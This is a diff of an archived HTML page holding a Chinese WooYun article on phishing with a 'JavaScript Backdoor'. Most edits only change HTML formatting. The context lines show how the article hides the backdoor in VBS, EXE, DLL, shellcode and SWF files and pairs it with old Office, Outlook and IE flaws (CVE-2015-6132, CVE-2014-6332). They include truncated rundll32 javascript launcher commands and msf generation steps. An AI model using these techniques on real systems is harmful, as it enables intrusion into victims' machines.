@@ -3,24 +3,24 @@
 			<head>
 			     <title>JavaScript Phishing - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/12386">http://drops.wooyun.org/tips/12386</a></h1>
 				
       <p>
-        <h1>0x00 前言</h1>
+        </p><h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
 <p>前段时间分享了JavaScript Backdoor技术，着重对其功能的开发、Bug的优化做了介绍，这次研究一下JavaScript Backdoor在实际渗透测试中的利用方法。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160122/2016012205003220554126.jpg" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160122/2016012205003220554126.jpg" alt="Alt text"></p>
 
 <!--more-->
 
 <h1>0x01 简介</h1>
 
-<hr />
+<hr>
 
 <p><strong>特点：</strong></p>
 
@@ -40,7 +40,7 @@
 
 <h1>0x02 隐藏在vbs中</h1>
 
-<hr />
+<hr>
 
 <p>最简便的方法，将JavaScript的上线代码写到vbs中</p>
 
@@ -61,7 +61,7 @@ shell.run "rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.w
 
 <h1>0x03 隐藏在exe中</h1>
 
-<hr />
+<hr>
 
 <p><strong>开发工具：</strong><code>VC6.0</code></p>
 
@@ -113,7 +113,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 
 <h1>0x04 隐藏在dll中</h1>
 
-<hr />
+<hr>
 
 <p><strong>开发工具：</strong><code>VC6.0</code></p>
 
@@ -123,7 +123,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 
 <p>CVE-2015-6132 ，是一个类似于dll劫持的漏洞，如果在特定word文档的同级目录下放置一个dll，那么在打开word文档并点击图标后会运行同级目录下dll的代码</p>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160122/2016012205003621225240.png" alt="Alt text" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20160122/2016012205003621225240.png" alt="Alt text"></p>
 
 <p>planted-mqrt.doc里面包含图标foo.txt,如果点击图标，那么会运行mqrt.dll中的代码，即弹框</p>
 
@@ -159,19 +159,19 @@ BOOL APIENTRY DllMain( HANDLE hModule,
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160122/2016012205003893692328.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160122/2016012205003893692328.png" alt="Alt text"></p>
 
 <p>打开CVE-2015-6132.rtf，没有任何异常反应</p>
 
 <p>而这时我们的控制端已经弹回了shell，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160122/2016012205003981816430.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160122/2016012205003981816430.png" alt="Alt text"></p>
 
 <p>即使此时关闭CVE-2015-6132.rtf，shell仍然可以继续操作</p>
 
 <h1>0x05 转换成shellcode</h1>
 
-<hr />
+<hr>
 
 <p><strong>开发工具：</strong><code>msf、vc6.0</code></p>
 
@@ -191,7 +191,7 @@ set TEXT rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";
 generate -t c
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160122/2016012205004254618525.png" alt="Alt text" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20160122/2016012205004254618525.png" alt="Alt text"></p>
 
 <p>不难看出msf也存在转义字符</p>
 
@@ -235,7 +235,7 @@ __asm{
 
 <p>如下图可以看到弹框，shellcode执行成功</p>
 
-<p><img src="http://static.wooyun.org//drops/20160122/2016012205004438134621.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160122/2016012205004438134621.png" alt="Alt text"></p>
 
 <h3>2、将JavaScript Backdoor转换成shellcode</h3>
 
@@ -247,7 +247,7 @@ set CMD rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.wr
 generate -t c
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160122/2016012205004689466720.png" alt="Alt text" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20160122/2016012205004689466720.png" alt="Alt text"></p>
 
 <p>放在c++中测试shellcode，代码如下</p>
 
@@ -324,13 +324,13 @@ set CMD rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.wr
 generate -t dword
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160122/2016012205004860857818.png" alt="Alt text" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20160122/2016012205004860857818.png" alt="Alt text"></p>
 
 <p><strong>2、</strong>修改原工程文件 ,使用Adobe Flash CS6 编译生成新的swf</p>
 
 <p>如图新编译的swf使用浏览器打开，弹回shell</p>
 
-<p><img src="http://static.wooyun.org//drops/20160122/2016012205005018848918.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160122/2016012205005018848918.png" alt="Alt text"></p>
 
 <p>同样，将swf嵌入word、ppt、xls，均可弹回shell</p>
 
@@ -338,7 +338,7 @@ generate -t dword
 
 <h1>0x06 结合Outlook漏洞</h1>
 
-<hr />
+<hr>
 
 <p><strong>细节可参考:</strong> <a href="http://zone.wooyun.org/content/24657">http://zone.wooyun.org/content/24657</a></p>
 
@@ -353,19 +353,19 @@ outlook2007
 
 <p>如图,内容中包含一个docx的图标</p>
 
-<p><img src="http://static.wooyun.org//drops/20160122/20160122050052702071020.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160122/20160122050052702071020.png" alt="Alt text"></p>
 
 <p>现在双击打开，如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160122/20160122050054736681123.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160122/20160122050054736681123.png" alt="Alt text"></p>
 
 <p>点击确定后，接着弹框，如图，随后弹回shell</p>
 
-<p><img src="http://static.wooyun.org//drops/20160122/20160122050056608621217.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160122/20160122050056608621217.png" alt="Alt text"></p>
 
 <h1>0x07 结合ie漏洞</h1>
 
-<hr />
+<hr>
 
 <p><strong>结合漏洞：</strong><code>CVE-2014-6332</code></p>
 
@@ -394,27 +394,27 @@ end function
 python -m SimpleHTTPServer 80
 </code></pre>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160122/20160122050058519371316.png" alt="Alt text" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20160122/20160122050058519371316.png" alt="Alt text"></p>
 
 <h3>3、访问<code>http://192.168.174.133/JavaScript.html</code></h3>
 
 <p>xp系统访问直接弹回shell</p>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160122/20160122050100824201414.png" alt="Alt text" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20160122/20160122050100824201414.png" alt="Alt text"></p>
 
 <p>win7 x64访问会弹框</p>
 
-<p>如图 <img src="http://static.wooyun.org//drops/20160122/20160122050103693631513.png" alt="Alt text" /> <img src="http://static.wooyun.org//drops/20160122/20160122050105537081611.png" alt="Alt text" /></p>
+<p>如图 <img src="http://static.wooyun.org//drops/20160122/20160122050103693631513.png" alt="Alt text"> <img src="http://static.wooyun.org//drops/20160122/20160122050105537081611.png" alt="Alt text"></p>
 
 <h1>0x08 小结</h1>
 
-<hr />
+<hr>
 
 <p>通过以上内容，结合最近流行的IE、Office等经典的钓鱼漏洞对JavaScript的用法做简要介绍，希望能让大家有所启发，JavaScript Backdoor在渗透中会发挥越来越大的作用。</p>
 
 <p>当然，上述漏洞的防御方法已经普及，对于普通用户来说，建议及时更新补丁安装最新杀毒软件和防火墙。</p>
 
-<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p>      </p>
+<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p>      <p></p>
     
 			</body>
 		</html>
